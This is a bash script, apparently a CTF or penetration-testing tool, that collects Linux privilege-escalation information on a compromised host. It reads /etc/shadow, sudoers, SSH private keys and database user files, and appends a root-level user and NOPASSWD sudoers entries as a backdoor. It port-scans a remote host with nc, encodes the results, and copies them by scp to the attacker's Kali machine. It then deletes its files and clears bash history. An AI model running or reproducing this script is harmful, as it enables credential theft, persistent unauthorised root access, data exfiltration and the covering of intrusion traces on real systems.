#!/bin/bash
#This script will enumerate information used for privilege escalation
#Usage:        	  ./priv3num <RHOST> <LHOST>
B='\033[0;96m' #${B}
G='\033[0;92m' #${G}
R='\033[0;91m' #${R}
N='\033[0m'    #${N}
cd /tmp/
printf "${B}\n------------------------------Start------------------------------\n\n${G}" | tee -a -i priv
date 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Inside a VM?------------------------------\n\n${R}" | tee -a -i priv
#sudo dmidecode -s system-manufacturer 2>/dev/null | tee -a -i priv
#sudo dmidecode | grep Product 2>/dev/null | tee -a -i priv
#sudo dmesg | grep "Hypervisor detected" 2>/dev/null | tee -a -i priv
hostnamectl 2>/dev/null | tee -a -i priv
systemd-detect-virt 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------IP------------------------------\n\n${G}" | tee -a -i priv
ip addr show 2>/dev/null | tee -a -i priv
netstat -tulpn 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------OS------------------------------\n\n${Y}" | tee -a -i priv
uname -a 2>/dev/null | tee -a -i priv
cat /etc/*-release 2>/dev/null | tee -a -i priv
cat /proc/version 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Versions------------------------------\n\n${Y}" | tee -a -i priv
bash --version 2>/dev/null | tee -a -i priv
sudo --version 2>/dev/null | tee -a -i priv
python --version 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------User------------------------------\n\n${Y}" | tee -a -i priv
hostname 2>/dev/null | tee -a -i priv
id 2>/dev/null | tee -a -i priv
whoami 2>/dev/null | tee -a -i priv
dnsdomainname 2>/dev/null | tee -a -i priv
w 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Sudo privileges------------------------------\n\n${R}" | tee -a -i priv
sudo -l 2>/dev/null | tee -a -i priv
#sudo -l -l 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Read/Edit passwd/shadow/sudoers------------------------------\n\n${R}" | tee -a -i priv
cat /etc/passwd | grep home 2>/dev/null | tee -a -i priv
cat</etc/passwd 2>/dev/null | tee -a -i priv
cat /etc/shadow 2>/dev/null | tee -a -i priv
cat /etc/security/opasswd 2>/dev/null | tee -a -i priv
echo "test1:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null | tee -a -i priv
echo "test1 ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers 2>/dev/null | tee -a -i priv
echo "tes1 ALL=NOPASSWD: /bin/bash" >>/etc/sudoers 2>/dev/null | tee -a -i priv 
printf "${B}\n------------------------------SUID------------------------------\n\n${R}" | tee -a -i priv
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null | tee -a -i priv
find / -type f -perm -04000 -ls 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Path------------------------------\n\n${R}" | tee -a -i priv
echo $PATH 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Crontabs------------------------------\n\n${R}" | tee -a -i priv
cat /etc/crontab 2>/dev/null | tee -a -i priv
crontab -l 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Find id_rsa------------------------------\n\n${R}" | tee -a -i priv
find / -name id_rsa 2>/dev/null | tee -a -i priv
find ~/ -name id_rsa 2> /dev/null | tee -a -i priv
cat ~/.ssh/id_rsa 2>/dev/null | tee -a -i priv
cat ~/.ssh/id_key 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Capabilities------------------------------\n\n${R}" | tee -a -i priv
getcap -r / 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Writable root files/folders------------------------------\n\n${R}" | tee -a -i priv
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Home dir------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/ 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------User file contents------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/* 2>/dev/null | tee -a -i priv							
printf "${B}\n------------------------------Misc.------------------------------\n\n${Y}" | tee -a -i priv
cat /etc/security/opasswd 2>/dev/null | tee -a -i priv
cat /etc/sudoers 2>/dev/null | tee -a -i priv
cat /etc/exports 2>/dev/null | tee -a -i priv 
cat /etc/hosts 2>/dev/null | tee -a -i priv
cat /var/apache2/config.inc 2>/dev/null | tee -a -i priv
cat /var/lib/mysql/mysql/user.MYD 2>/dev/null | tee -a -i priv
cat /root/anaconda-ks.cfg 2>/dev/null | tee -a -i priv
ps aux | grep root 2>/dev/null | tee -a -i priv
netstat -tulpn 2>/dev/null | tee -a -i priv
nc -z -v $1 20-3389 2>&1 | grep succeeded 2>/dev/null | tee -a -i priv		
find /home -name .sudo_as_admin_successful 2>/dev/null | tee -a -i priv
find / -name "*.sh" 2>/dev/null | tee -a -i priv
find ~/ -name user.txt 2>/dev/null | tee -a -i priv
find ~/ -name flag.txt 2>/dev/null | tee -a -i priv
find ~/ -name root.txt 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Finished------------------------------\n\n" | tee -a -i priv
clear		
#base64 encode								  
base64 priv -w 0 2>/dev/null | tee -a -i a1
rm -r /tmp/priv 2>/dev/null
#hex encode
xxd -p /tmp/a1 | tr -d '\n' 2>/dev/null | tee -a -i a2
#hex decode         xxd -p -r /<FilePATH>/a2 | tee -a -i decoded
rm -r /tmp/a1 2>/dev/null
#send file a2
#scp -C /tmp/a2 kali@<LHOST/tun0>:/home/kali/ 
scp -C /tmp/a2 kali@$2:/home/kali/ 2>/dev/null
rm -r /tmp/a2 2>/dev/null
#clear history
cat /dev/null > ~/.bash_history 2>/dev/null
